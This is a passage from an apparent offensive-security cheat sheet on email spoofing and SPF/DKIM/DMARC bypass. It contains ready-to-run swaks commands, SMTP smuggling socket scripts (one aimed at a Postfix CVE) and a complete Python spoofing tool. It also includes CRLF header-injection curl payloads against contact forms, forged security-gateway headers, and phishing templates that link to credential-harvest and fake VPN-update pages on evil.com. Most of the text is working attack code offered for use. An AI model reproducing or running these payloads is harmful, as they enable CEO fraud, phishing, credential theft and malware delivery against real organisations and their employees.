  :::tabs-item{icon="i-lucide-terminal" label="RFC5322.From Parsing Exploits"}
  ```bash
  # Exploiting parser differences in From: header

  # Route-portion abuse
  swaks --to victim@company.com \
        --header "From: <@evil.com:ceo@target.com>" \
        --server company-mx.company.com

  # Quoted string abuse
  swaks --to victim@company.com \
        --header 'From: "ceo@target.com"@evil.com' \
        --server company-mx.company.com

  # Comment injection
  swaks --to victim@company.com \
        --header "From: ceo(real)@target.com(fake)@evil.com" \
        --server company-mx.company.com

  # Folding whitespace injection
  swaks --to victim@company.com \
        --header "From: ceo@target.com\r\n\t<attacker@evil.com>" \
        --server company-mx.company.com

  # Display name with angle bracket confusion
  swaks --to victim@company.com \
        --header 'From: ceo@target.com <attacker@evil.com>' \
        --server company-mx.company.com

  # Tab separated From
  swaks --to victim@company.com \
        --header "From: ceo@target.com\tattacker@evil.com" \
        --server company-mx.company.com
  ```
  :::
::

---

## SMTP Smuggling

### SMTP Protocol Smuggling Attacks

::note
SMTP smuggling exploits differences in how sending and receiving mail servers parse SMTP data termination sequences (`.` on a line by itself). This allows injecting a second spoofed message within a legitimate SMTP session.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Basic SMTP Smuggling"}
  ```bash
  # SMTP smuggling via data termination sequence differences
  # Some servers accept \n.\n instead of \r\n.\r\n

  python3 -c "
  import socket

  target_mx = 'target-mx.target.com'
  port = 25

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target_mx, port))
  print(s.recv(1024).decode())

  s.send(b'EHLO attacker.com\r\n')
  print(s.recv(1024).decode())

  s.send(b'MAIL FROM:<legit@attacker.com>\r\n')
  print(s.recv(1024).decode())

  s.send(b'RCPT TO:<victim@target.com>\r\n')
  print(s.recv(1024).decode())

  s.send(b'DATA\r\n')
  print(s.recv(1024).decode())

  # Smuggled message payload
  smuggled = (
      b'From: legit@attacker.com\r\n'
      b'To: victim@target.com\r\n'
      b'Subject: Legitimate email\r\n'
      b'\r\n'
      b'This is the legitimate part.\r\n'
      b'\n.\n'  # Non-standard termination - some servers accept this
      b'MAIL FROM:<ceo@target.com>\r\n'
      b'RCPT TO:<victim@target.com>\r\n'
      b'DATA\r\n'
      b'From: ceo@target.com\r\n'
      b'To: victim@target.com\r\n'
      b'Subject: URGENT - Wire Transfer\r\n'
      b'\r\n'
      b'Please process immediately.\r\n'
      b'.\r\n'
  )

  s.send(smuggled)
  print(s.recv(4096).decode())

  s.send(b'QUIT\r\n')
  s.close()
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="SMTP Smuggling Variants"}
  ```bash
  # Variant 1: LF-only termination
  python3 -c "
  payload = b'legitimate content\n.\nMAIL FROM:<ceo@target.com>\r\n'
  # ...
  "

  # Variant 2: CR-only termination
  python3 -c "
  payload = b'legitimate content\r.\rMAIL FROM:<ceo@target.com>\r\n'
  # ...
  "

  # Variant 3: Mixed line endings
  python3 -c "
  payload = b'legitimate content\r\n.\nMAIL FROM:<ceo@target.com>\r\n'
  # ...
  "

  # Variant 4: Bare LF after dot
  python3 -c "
  payload = b'legitimate content\r\n.\n'
  # ...
  "

  # Variant 5: Extra spaces/tabs around dot
  python3 -c "
  payload = b'legitimate content\r\n .\r\n'
  # ...
  "

  # Testing tool for SMTP smuggling
  # https://github.com/The-Login/smtp-smuggling-tools
  git clone https://github.com/The-Login/smtp-smuggling-tools.git
  cd smtp-smuggling-tools
  python3 smtp_smuggling_scanner.py --target target-mx.target.com --port 25
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Postfix/Sendmail/Exchange Specific"}
  ```bash
  # Postfix SMTP smuggling (CVE-2023-51764)
  # Postfix before 3.8.4 vulnerable to smuggling via
  # <LF>.<CR><LF> end-of-data sequence

  python3 -c "
  import socket

  s = socket.socket()
  s.connect(('target-mx.target.com', 25))
  s.recv(1024)
  s.send(b'EHLO test.com\r\n')
  s.recv(1024)
  s.send(b'MAIL FROM:<test@test.com>\r\n')
  s.recv(1024)
  s.send(b'RCPT TO:<victim@target.com>\r\n')
  s.recv(1024)
  s.send(b'DATA\r\n')
  s.recv(1024)

  # Smuggling payload for Postfix
  s.send(
      b'From: test@test.com\r\n'
      b'To: victim@target.com\r\n'
      b'Subject: test\r\n'
      b'\r\n'
      b'test body\n'
      b'.\r\n'  # <LF>.<CR><LF> smuggle sequence
      b'MAIL FROM:<ceo@target.com>\r\n'
      b'RCPT TO:<victim@target.com>\r\n'
      b'DATA\r\n'
      b'From: ceo@target.com\r\n'
      b'To: victim@target.com\r\n'
      b'Subject: Smuggled Spoofed Email\r\n'
      b'\r\n'
      b'This email bypasses SPF/DKIM/DMARC\r\n'
      b'.\r\n'
  )
  print(s.recv(4096))
  s.send(b'QUIT\r\n')
  s.close()
  "

  # Check Postfix version (banner grabbing)
  echo "EHLO test" | nc -w5 target-mx.target.com 25 | head -1
  nmap -sV -p25 target-mx.target.com --script=banner
  ```
  :::
::

---

## Email Spoofing Tools & Frameworks

### swaks (Swiss Army Knife for SMTP)

::code-group
```bash [Basic Spoofing]
# Simple spoof
swaks --to victim@target.com \
      --from ceo@target.com \
      --server target-mx.target.com \
      --header "Subject: Urgent" \
      --body "Please respond immediately."

# With authentication (via compromised/shared infrastructure)
swaks --to victim@target.com \
      --from ceo@target.com \
      --server smtp.gmail.com:587 \
      --tls \
      --auth-user compromised@gmail.com \
      --auth-password "password"

# With custom EHLO
swaks --to victim@target.com \
      --from ceo@target.com \
      --server target-mx.target.com \
      --ehlo mail.target.com

# With envelope sender different from header From
swaks --to victim@target.com \
      --mail-from "bounce@attacker.com" \
      --header "From: ceo@target.com" \
      --server target-mx.target.com
```

```bash [HTML Phishing]
# HTML email with embedded link
swaks --to victim@target.com \
      --from it@target.com \
      --server target-mx.target.com \
      --header "Subject: Password Expiry" \
      --header "Content-Type: text/html" \
      --body '<html><body>
<img src="https://target.com/logo.png" width="200">
<h2>Password Expiration Notice</h2>
<p>Your password will expire in 24 hours.</p>
<p><a href="https://evil.com/harvest" style="background:#0066cc;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;">Reset Password</a></p>
<p style="color:#666;font-size:12px;">IT Support Team<br>target.com</p>
</body></html>'

# With attachment
swaks --to victim@target.com \
      --from hr@target.com \
      --server target-mx.target.com \
      --header "Subject: Updated Benefits Package" \
      --attach-type application/pdf \
      --attach @malicious.pdf \
      --body "Please review the attached document."
```

```bash [Advanced Headers]
# Full header manipulation
swaks --to victim@target.com \
      --from ceo@target.com \
      --server target-mx.target.com \
      --header "Subject: Board Meeting Update" \
      --header "Reply-To: attacker@evil.com" \
      --header "X-Mailer: Microsoft Outlook 16.0" \
      --header "X-Originating-IP: [10.0.0.1]" \
      --header "Message-ID: <$(uuidgen)@target.com>" \
      --header "Date: $(date -R)" \
      --header "MIME-Version: 1.0" \
      --header "X-MS-Exchange-Organization-AuthAs: Internal" \
      --header "X-MS-Exchange-Organization-AuthSource: EXCH01.target.com" \
      --header "X-MS-Has-Attach: yes" \
      --body "Confidential information enclosed."

# TLS with certificate verification bypass
swaks --to victim@target.com \
      --from admin@target.com \
      --server target-mx.target.com \
      --tls \
      --tls-verify \
      --tls-ca-path /etc/ssl/certs

# Through SOCKS proxy
swaks --to victim@target.com \
      --from admin@target.com \
      --server target-mx.target.com \
      --proxy socks5://127.0.0.1:9050
```
::

### Python-Based Spoofing

::code-collapse
```python [email_spoofer.py]
#!/usr/bin/env python3
"""Advanced email spoofing framework with SPF/DKIM/DMARC bypass techniques"""

import smtplib
import ssl
import dns.resolver
import argparse
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

class EmailSpoofer:
    def __init__(self, target_domain):
        self.target_domain = target_domain
        self.mx_servers = []
        self.spf_record = None
        self.dmarc_record = None
        
    def enumerate(self):
        """Enumerate target domain email security"""
        print(f"\n[*] Enumerating {self.target_domain}")
        
        # MX records
        try:
            mx_records = dns.resolver.resolve(self.target_domain, 'MX')
            self.mx_servers = sorted([(r.preference, str(r.exchange).rstrip('.')) 
                                      for r in mx_records])
            for pref, mx in self.mx_servers:
                print(f"  [MX] {mx} (priority: {pref})")
        except Exception as e:
            print(f"  [!] MX lookup failed: {e}")
        
        # SPF
        try:
            txt_records = dns.resolver.resolve(self.target_domain, 'TXT')
            for rdata in txt_records:
                txt = rdata.to_text().strip('"')
                if txt.startswith('v=spf1'):
                    self.spf_record = txt
                    print(f"  [SPF] {txt}")
                    self._analyze_spf(txt)
        except Exception as e:
            print(f"  [SPF] No record found — SPOOFABLE")
        
        # DMARC
        try:
            dmarc_records = dns.resolver.resolve(f'_dmarc.{self.target_domain}', 'TXT')
            for rdata in dmarc_records:
                txt = rdata.to_text().strip('"')
                if 'v=DMARC1' in txt:
                    self.dmarc_record = txt
                    print(f"  [DMARC] {txt}")
                    self._analyze_dmarc(txt)
        except Exception as e:
            print(f"  [DMARC] No record found — SPOOFABLE")
    
    def _analyze_spf(self, record):
        if '+all' in record:
            print(f"    [!] SPF +all — FULLY OPEN")
        elif '~all' in record:
            print(f"    [!] SPF ~all — SOFTFAIL (spoofing likely works)")
        elif '?all' in record:
            print(f"    [!] SPF ?all — NEUTRAL (spoofing likely works)")
        elif '-all' in record:
            print(f"    [-] SPF -all — HARDFAIL (bypass needed)")
    
    def _analyze_dmarc(self, record):
        import re
        policy = re.search(r'p=(\w+)', record)
        sp = re.search(r'sp=(\w+)', record)
        pct = re.search(r'pct=(\d+)', record)
        aspf = re.search(r'aspf=(\w)', record)
        adkim = re.search(r'adkim=(\w)', record)
        
        if policy:
            p = policy.group(1)
            if p == 'none':
                print(f"    [!] DMARC p=none — NO ENFORCEMENT")
            elif p == 'quarantine':
                print(f"    [!] DMARC p=quarantine — SPAM folder")
            elif p == 'reject':
                print(f"    [-] DMARC p=reject — Bypass needed")
        
        if sp:
            if sp.group(1) == 'none':
                print(f"    [!] DMARC sp=none — SUBDOMAIN SPOOFABLE")
        elif policy and policy.group(1) != 'none':
            print(f"    [*] No sp= set — check subdomain behavior")
        
        if pct:
            pct_val = int(pct.group(1))
            if pct_val < 100:
                print(f"    [!] DMARC pct={pct_val} — Only {pct_val}% enforced!")
            if pct_val == 0:
                print(f"    [!] DMARC pct=0 — EFFECTIVELY NO ENFORCEMENT")
        
        if aspf and aspf.group(1) == 'r':
            print(f"    [!] aspf=r — Relaxed SPF alignment (subdomain abuse)")
        if adkim and adkim.group(1) == 'r':
            print(f"    [!] adkim=r — Relaxed DKIM alignment (subdomain abuse)")
    
    def spoof(self, from_addr, to_addr, subject, body, html=False, 
              mx_server=None, ehlo_domain=None, reply_to=None):
        """Send spoofed email"""
        
        if not mx_server:
            if self.mx_servers:
                mx_server = self.mx_servers[0][1]
            else:
                print("[!] No MX server specified")
                return False
        
        # Build message
        if html:
            msg = MIMEMultipart('alternative')
            msg.attach(MIMEText(body, 'html'))
        else:
            msg = MIMEText(body)
        
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        msg['Date'] = datetime.now().strftime('%a, %d %b %Y %H:%M:%S %z')
        msg['Message-ID'] = f'<{datetime.now().strftime("%Y%m%d%H%M%S")}@{self.target_domain}>'
        msg['X-Mailer'] = 'Microsoft Outlook 16.0'
        
        if reply_to:
            msg['Reply-To'] = reply_to
        
        try:
            smtp = smtplib.SMTP(mx_server, 25, timeout=30)
            if ehlo_domain:
                smtp.ehlo(ehlo_domain)
            else:
                smtp.ehlo(self.target_domain)
            
            # Try STARTTLS
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                smtp.starttls(context=context)
                smtp.ehlo(ehlo_domain or self.target_domain)
            except:
                pass
            
            smtp.sendmail(from_addr, to_addr, msg.as_string())
            smtp.quit()
            print(f"[+] Spoofed email sent: {from_addr} → {to_addr}")
            return True
        except Exception as e:
            print(f"[!] Failed: {e}")
            return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Email Spoofing Tool')
    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-f', '--from-addr', help='From address')
    parser.add_argument('-t', '--to-addr', help='To address')
    parser.add_argument('-s', '--subject', default='Test', help='Subject')
    parser.add_argument('-b', '--body', default='Test email', help='Body')
    parser.add_argument('--html', action='store_true', help='HTML body')
    parser.add_argument('--mx', help='MX server override')
    parser.add_argument('--ehlo', help='EHLO domain')
    parser.add_argument('--reply-to', help='Reply-To address')
    parser.add_argument('--enum-only', action='store_true', help='Enumerate only')
    
    args = parser.parse_args()
    
    spoofer = EmailSpoofer(args.domain)
    spoofer.enumerate()
    
    if not args.enum_only and args.from_addr and args.to_addr:
        spoofer.spoof(
            args.from_addr, args.to_addr, args.subject, args.body,
            html=args.html, mx_server=args.mx, ehlo_domain=args.ehlo,
            reply_to=args.reply_to
        )
```
::

### Additional Spoofing Tools

::card-group
  ::card
  ---
  title: SET (Social Engineering Toolkit)
  icon: i-lucide-shield-alert
  ---
  ```bash
  setoolkit
  # 1) Social-Engineering Attacks
  # 5) Mass Mailer Attack
  # 1) E-Mail Attack Single Email Address
  # Configure From, To, Subject, Body
  # Supports HTML templates
  ```
  ::

  ::card
  ---
  title: Gophish
  icon: i-lucide-fish
  ---
  ```bash
  # Full phishing framework
  ./gophish
  # Access at https://127.0.0.1:3333
  # Create campaign with spoofed sender
  # Track opens, clicks, credentials
  # Supports custom SMTP profiles
  ```
  ::

  ::card
  ---
  title: King Phisher
  icon: i-lucide-crown
  ---
  ```bash
  # Advanced phishing platform
  king-phisher
  # Configurable SMTP settings
  # Template-based emails
  # SPF/DKIM aware sending
  # Campaign analytics
  ```
  ::

  ::card
  ---
  title: emkei.cz (Web-based)
  icon: i-lucide-globe
  ---
  ```bash
  # Online email spoofing service
  # https://emkei.cz/
  # Supports custom headers
  # From/Reply-To manipulation
  # Attachment support
  # Use via Tor for anonymity
  ```
  ::
::

---

## Advanced Bypass Chains

### Combined Attack Workflows

::steps{level="4"}

#### Recon Phase — Identify Weakest Link

```bash
# Full reconnaissance script
#!/bin/bash
DOMAIN=$1

echo "=== SPF ==="
dig +short TXT $DOMAIN | grep spf

echo -e "\n=== DKIM (common selectors) ==="
for s in default google selector1 selector2 s1 s2 k1 mail dkim; do
  r=$(dig +short TXT ${s}._domainkey.$DOMAIN 2>/dev/null)
  [ -n "$r" ] && echo "  $s: $r"
done

echo -e "\n=== DMARC ==="
dig +short TXT _dmarc.$DOMAIN

echo -e "\n=== MX ==="
dig +short MX $DOMAIN

echo -e "\n=== Subdomain DMARC ==="
for sub in mail dev staging test www app api portal; do
  r=$(dig +short TXT _dmarc.${sub}.$DOMAIN 2>/dev/null)
  echo "  ${sub}.$DOMAIN: ${r:-NO DMARC}"
done

echo -e "\n=== Spoofcheck ==="
python3 spoofcheck.py $DOMAIN 2>/dev/null
```

#### Identify Attack Vector

```text
Decision Tree:

1. No DMARC record?
   → Direct spoofing from any server

2. DMARC p=none?
   → Direct spoofing (SPF/DKIM failures ignored)

3. DMARC pct=0 or pct<100?
   → Direct spoofing (policy not fully enforced)

4. DMARC sp=none with p=reject?
   → Spoof from subdomain

5. SPF ~all or ?all?
   → Direct spoofing (softfail accepted by most servers)

6. SPF includes shared infrastructure?
   → Send via shared provider (Google/O365/SES)

7. SPF exceeds 10 DNS lookups?
   → SPF returns permerror (fails open)

8. DKIM key ≤1024-bit?
   → Factor key and forge signatures

9. DKIM t=y (testing)?
   → DKIM failures ignored

10. Relaxed alignment (aspf=r/adkim=r)?
    → Subdomain alignment bypass

11. None of the above?
    → SMTP smuggling techniques
    → Header ambiguity attacks
    → Display name spoofing
```

#### Execute Attack

```bash
# Example: Subdomain bypass chain
# Target: target.com with p=reject, sp=none, aspf=r

# 1. Confirm subdomain has no DMARC/SPF
dig +short TXT _dmarc.dev.target.com  # No result
dig +short TXT dev.target.com | grep spf  # No result

# 2. Spoof from subdomain
swaks --to victim@company.com \
      --from admin@dev.target.com \
      --mail-from "admin@dev.target.com" \
      --header "From: IT Admin <admin@dev.target.com>" \
      --header "Reply-To: attacker@evil.com" \
      --header "Subject: VPN Client Update Required" \
      --header "X-Mailer: Microsoft Outlook 16.0" \
      --header "MIME-Version: 1.0" \
      --header "Content-Type: text/html" \
      --server company-mx.company.com \
      --ehlo dev.target.com \
      --body '<html><body>
<p>Dear User,</p>
<p>A critical security update is required for your VPN client.</p>
<p><a href="https://evil.com/vpn-update.exe">Download Update</a></p>
<p>IT Security Team<br>target.com</p>
</body></html>'
```

#### Verify Delivery & Headers

```bash
# Check if email was delivered and how it was authenticated
# Look for these headers in the received email:

# Authentication-Results header analysis
grep -i "authentication-results" received_email.eml

# Expected results for successful bypass:
# spf=none (no SPF for subdomain)
# dkim=none (no DKIM signature)
# dmarc=pass (sp=none allows it)
# OR
# dmarc=bestguesspass

# Check X-MS-Exchange-Organization-AuthAs header
# "Anonymous" = external, unauthenticated
# "Internal" = trusted (spoofed successfully)
```
::

---

## Display Name & Lookalike Attacks

::tip
When technical SPF/DKIM/DMARC bypass is not feasible, display name attacks and homograph domains provide alternative spoofing paths that bypass authentication entirely by using legitimately controlled domains.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Display Name Spoofing"}
  ```bash
  # Display name shows target identity, actual email is attacker's
  # Most mobile clients only show display name

  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header 'From: "John Smith - CEO" <attacker@evil.com>' \
        --header "Subject: Quick favor" \
        --server company-mx.company.com \
        --body "Are you available? I need something handled discreetly."

  # With target email in display name
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header 'From: "ceo@target.com" <attacker@evil.com>' \
        --server company-mx.company.com

  # With Unicode tricks in display name
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header 'From: "CEO Target Corp ✓" <attacker@evil.com>' \
        --server company-mx.company.com

  # With invisible Unicode characters
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header "From: =?utf-8?Q?CEO=E2=80=8B@target.com?= <attacker@evil.com>" \
        --server company-mx.company.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Homograph / Lookalike Domains"}
  ```bash
  # Register lookalike domains with proper SPF/DKIM/DMARC
  # Then send fully authenticated spoofed emails

  # IDN homograph attacks
  # target.com → tаrget.com (Cyrillic 'а')
  # target.com → targеt.com (Cyrillic 'е')
  # target.com → targёt.com

  # Typosquatting
  # target.com → targt.com
  # target.com → targett.com
  # target.com → target-corp.com
  # target.com → target.co
  # target.com → t-arget.com
  # target.com → targ3t.com

  # Generate lookalike domains
  dnstwist -r target.com
  dnstwist -r --tld-dict /usr/share/dnstwist/database/tld.dict target.com
  urlcrazy target.com

  # Once registered with proper auth records:
  swaks --to victim@company.com \
        --from ceo@targt.com \
        --header "From: CEO <ceo@targt.com>" \
        --server company-mx.company.com \
        --header "Subject: Quick Question"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Email Address Internationalization (EAI)"}
  ```bash
  # Exploit internationalized email addresses
  # RFC 6531 allows UTF-8 in email addresses

  # Using SMTPUTF8 extension
  python3 -c "
  import smtplib

  s = smtplib.SMTP('target-mx.target.com', 25)
  s.ehlo()
  
  # Check for SMTPUTF8 support
  if s.has_extn('SMTPUTF8'):
      print('[+] Server supports SMTPUTF8')
      # Send with internationalized address
      s.sendmail(
          'cеo@target.com',  # Cyrillic 'е'
          'victim@target.com',
          'From: cеo@target.com\r\nTo: victim@target.com\r\nSubject: Test\r\n\r\nTest',
          mail_options=['SMTPUTF8']
      )
  else:
      print('[-] No SMTPUTF8 support')
  s.quit()
  "
  ```
  :::
::

---

## SMTP Header Injection

### Header Injection via Application Input

::caution
Web applications that send emails with user-controlled input in headers (contact forms, registration emails, password resets) may be vulnerable to SMTP header injection.
::

::code-group
```bash [CRLF Injection in From/To]
# Inject additional headers via CRLF in email fields
# Target: Contact form that sets From: header from user input

# Inject CC header
curl -X POST https://target.com/contact \
  -d "name=attacker" \
  -d "email=attacker@evil.com%0ACc:victim2@company.com" \
  -d "message=test"

# Inject BCC header
curl -X POST https://target.com/contact \
  -d "name=attacker" \
  -d "email=attacker@evil.com%0D%0ABcc:victim@company.com" \
  -d "message=test"

# Inject entirely new email via DATA termination
curl -X POST https://target.com/contact \
  -d "name=attacker" \
  -d "email=attacker@evil.com%0D%0A%0D%0A.%0D%0AMAIL FROM:<ceo@target.com>%0D%0ARCPT TO:<victim@company.com>%0D%0ADATA%0D%0AFrom: ceo@target.com%0D%0ASubject: Urgent%0D%0A%0D%0ASpoofed body%0D%0A." \
  -d "message=test"
```

```bash [Subject Header Injection]
# Inject via Subject field
curl -X POST https://target.com/contact \
  -d "name=attacker" \
  -d "email=attacker@evil.com" \
  -d "subject=Test%0D%0ABcc:victim@company.com%0D%0AContent-Type:text/html%0D%0A%0D%0A<h1>Phishing</h1>" \
  -d "message=test"

# Null byte injection
curl -X POST https://target.com/contact \
  -d "name=attacker" \
  -d "email=attacker@evil.com" \
  -d "subject=Test%00%0D%0ABcc:all-staff@company.com" \
  -d "message=test"
```

```bash [Parameter Pollution]
# Double parameter injection
curl -X POST https://target.com/contact \
  -d "email=attacker@evil.com" \
  -d "email=victim@company.com" \
  -d "name=test" \
  -d "message=test"

# Array injection
curl -X POST https://target.com/contact \
  -d "email[]=attacker@evil.com" \
  -d "email[]=victim@company.com"
```
::

---

## Open Relay Discovery & Abuse

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Open Relay Detection"}
  ```bash
  # Nmap open relay scan
  nmap -p25 --script smtp-open-relay target-mx.target.com
  nmap -p25 --script smtp-open-relay --script-args \
    smtp-open-relay.from="test@target.com",smtp-open-relay.to="test@external.com" \
    target-mx.target.com

  # Scan multiple MX servers
  nmap -p25 --script smtp-open-relay -iL mx_servers.txt

  # Manual open relay test with telnet
  telnet target-mx.target.com 25
  # EHLO test.com
  # MAIL FROM:<test@external.com>
  # RCPT TO:<victim@another-external.com>
  # If "250 OK" → Open relay confirmed

  # swaks open relay test
  swaks --to external@gmail.com \
        --from test@external.com \
        --server target-mx.target.com

  # Mass relay scanning
  for ip in $(cat smtp_servers.txt); do
    result=$(swaks --to test@gmail.com \
                   --from test@test.com \
                   --server $ip \
                   --timeout 10 2>&1)
    if echo "$result" | grep -q "250 "; then
      echo "[+] OPEN RELAY: $ip"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Open Relay Abuse"}
  ```bash
  # Once open relay is found, use it for spoofing
  # Emails sent through target's own MX will pass SPF

  swaks --to victim@company.com \
        --from ceo@target.com \
        --server open-relay-mx.target.com \
        --header "From: CEO <ceo@target.com>" \
        --header "Subject: Quarterly Review" \
        --body "Please schedule a meeting."

  # Through open relay with TLS
  swaks --to victim@company.com \
        --from admin@target.com \
        --server open-relay.target.com \
        --tls \
        --header "Subject: System Maintenance"

  # Enumerate SMTP commands supported
  nmap -p25 --script smtp-commands target-mx.target.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="SMTP VRFY/EXPN Enumeration"}
  ```bash
  # User enumeration via VRFY
  smtp-user-enum -M VRFY -U users.txt -t target-mx.target.com

  # User enumeration via EXPN (mailing lists)
  smtp-user-enum -M EXPN -U users.txt -t target-mx.target.com

  # User enumeration via RCPT TO
  smtp-user-enum -M RCPT -U users.txt -t target-mx.target.com

  # Manual VRFY
  swaks --to "" --server target-mx.target.com --quit-after RCPT \
        --header "VRFY admin"

  # Nmap user enumeration
  nmap -p25 --script smtp-enum-users \
    --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} \
    target-mx.target.com

  # Custom wordlist for enum
  for user in admin root postmaster webmaster info support; do
    echo "VRFY ${user}" | nc -w5 target-mx.target.com 25
  done
  ```
  :::
::

---

## Bypassing Email Security Gateways

### Gateway-Specific Bypass Techniques

::accordion
  :::accordion-item{icon="i-lucide-shield" label="Proofpoint Bypass"}
  ```bash
  # Header manipulation to bypass Proofpoint analysis
  swaks --to victim@target.com \
        --from trusted@partner.com \
        --server target-mx.target.com \
        --header "X-Proofpoint-Spam-Details: rule=notspam" \
        --header "X-Proofpoint-Virus-Version: vendor=clean"

  # URL obfuscation for Proofpoint URL defense
  # Use URL shorteners, redirects, or data URIs
  # Base64 encoded URLs
  # JavaScript-based redirects in HTML emails
  ```
  :::

  :::accordion-item{icon="i-lucide-shield" label="Microsoft Defender / EOP Bypass"}
  ```bash
  # Bypass Exchange Online Protection
  # Use Microsoft 365 shared infrastructure

  # Internal header spoofing
  swaks --to victim@target.com \
        --from internal@target.com \
        --server target-mx.target.com \
        --header "X-MS-Exchange-Organization-AuthAs: Internal" \
        --header "X-MS-Exchange-Organization-AuthMechanism: 04" \
        --header "X-MS-Exchange-Organization-AuthSource: EXCH01.target.com" \
        --header "X-OriginatorOrg: target.com" \
        --header "X-MS-Exchange-CrossTenant-AuthAs: Internal" \
        --header "X-MS-Exchange-CrossTenant-AuthSource: EXCH01.target.com" \
        --header "X-MS-Exchange-CrossTenant-originalarrivaltime: $(date -u +%d\ %b\ %Y\ %H:%M:%S.0000)" \
        --header "X-MS-Exchange-CrossTenant-fromentityheader: Hosted" \
        --header "X-MS-Exchange-CrossTenant-id: tenant-guid-here" \
        --header "X-MS-Exchange-Transport-CrossTenantHeadersStamped: EXCH01"

  # SCL (Spam Confidence Level) manipulation
  swaks --to victim@target.com \
        --from admin@target.com \
        --server target-mx.target.com \
        --header "X-MS-Exchange-Organization-SCL: -1"
  ```
  :::

  :::accordion-item{icon="i-lucide-shield" label="Mimecast Bypass"}
  ```bash
  # Mimecast header injection
  swaks --to victim@target.com \
        --from trusted@target.com \
        --server target-mx.target.com \
        --header "X-Mimecast-Spam-Score: 0" \
        --header "X-Mimecast-Impersonation-Protect: false"

  # Route email around Mimecast
  # Find direct MX behind Mimecast
  # Check for direct IP access
  nmap -Pn -p25,465,587 target.com
  dig +short A mail.target.com
  dig +short A smtp.target.com
  dig +short A exchange.target.com
  ```
  :::

  :::accordion-item{icon="i-lucide-shield" label="Generic Gateway Bypass"}
  ```bash
  # Encoding-based bypass
  # Base64 encoded subjects
  swaks --to victim@target.com \
        --from admin@target.com \
        --header "Subject: =?utf-8?B?VXJnZW50OiBQYXNzd29yZCBSZXNldA==?=" \
        --server target-mx.target.com

  # Quoted-printable encoding
  swaks --to victim@target.com \
        --from admin@target.com \
        --header "Subject: =?utf-8?Q?Urgent=3A_Password_Reset?=" \
        --server target-mx.target.com

  # Multipart MIME confusion
  swaks --to victim@target.com \
        --from admin@target.com \
        --header "Content-Type: multipart/mixed; boundary=BOUNDARY" \
        --body '--BOUNDARY
Content-Type: text/plain

Benign content for scanner
--BOUNDARY
Content-Type: text/html

<html><body><a href="https://evil.com">Click here</a></body></html>
--BOUNDARY--'
  ```
  :::
::

---

## Verification & Analysis

### Email Header Analysis

::code-group
```bash [Authentication-Results Parsing]
# Extract and analyze Authentication-Results header
# from a test email you sent

# Check SPF result
grep -i "spf=" received_email.eml
# spf=pass → SPF passed
# spf=softfail → SPF softfail (may still deliver)
# spf=fail → SPF failed
# spf=none → No SPF record

# Check DKIM result
grep -i "dkim=" received_email.eml
# dkim=pass → Valid DKIM signature
# dkim=fail → Invalid signature
# dkim=none → No signature

# Check DMARC result
grep -i "dmarc=" received_email.eml
# dmarc=pass → DMARC alignment passed
# dmarc=fail → DMARC alignment failed
# dmarc=bestguesspass → No DMARC, but heuristic pass
# dmarc=none → No DMARC record

# Full header analysis
grep -E "(Received|From|Return-Path|Authentication-Results|X-MS|ARC|DKIM)" \
  received_email.eml
```

```bash [ARC Header Analysis]
# ARC (Authenticated Received Chain) headers
# Used when emails are forwarded through intermediaries
grep -i "ARC-" received_email.eml

# ARC can override DMARC failures for forwarded mail
# Check ARC-Authentication-Results
# Check ARC-Message-Signature
# Check ARC-Seal

# If ARC is trusted by recipient, DMARC failure may be overridden
```

```bash [Online Analysis Tools]
# Google Admin Toolbox - Email Header Analyzer
# https://toolbox.googleapps.com/apps/messageheader/

# MXToolbox Header Analyzer
# https://mxtoolbox.com/EmailHeaders.aspx

# Mail Header Analyzer (CLI)
pip install mail-parser
python3 -c "
import mailparser
mail = mailparser.parse_from_file('received_email.eml')
print('From:', mail.from_)
print('To:', mail.to)
print('Subject:', mail.subject)
print('Headers:', mail.headers)
"
```
::

### Testing Email Authentication

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---
```bash
# Send test emails and verify authentication results
# Use mail-tester.com for comprehensive analysis

# Step 1: Get a test address from mail-tester.com
# Step 2: Send spoofed email to that address
swaks --to test-id@srv1.mail-tester.com \
      --from ceo@target.com \
      --server srv1.mail-tester.com \
      --header "Subject: SPF DKIM DMARC Test"

# Step 3: Check results at mail-tester.com
```

#code
```bash
# Alternative testing services
# learndmarc.com - Visual SPF/DKIM/DMARC testing
# appmaildev.com - Email authentication testing
# dkimvalidator.com - DKIM signature validation
```
::

---

## Quick Reference — Attack Decision Matrix

::collapsible
**Bypass Matrix Based on Configuration**

| SPF | DKIM | DMARC | Attack Vector | Success Rate |
|-----|------|-------|---------------|-------------|
| No record | No record | No record | Direct spoof from any server | **100%** |
| `+all` | Any | Any | Direct spoof | **100%** |
| `~all` | Any | `p=none` | Direct spoof | **95%** |
| `?all` | Any | `p=none` | Direct spoof | **95%** |
| `-all` | Any | `p=none` | Direct spoof (DMARC ignores failure) | **90%** |
| Any | Any | `pct=0` | Direct spoof | **95%** |
| Any | Any | `sp=none` | Subdomain spoof | **90%** |
| Includes shared infra | Any | `p=reject` | Send via shared provider | **85%** |
| `>10 lookups` | Any | `p=reject` | SPF permerror fails open | **70%** |
| `-all` | `t=y` | `p=reject; adkim=r` | DKIM testing mode bypass | **60%** |
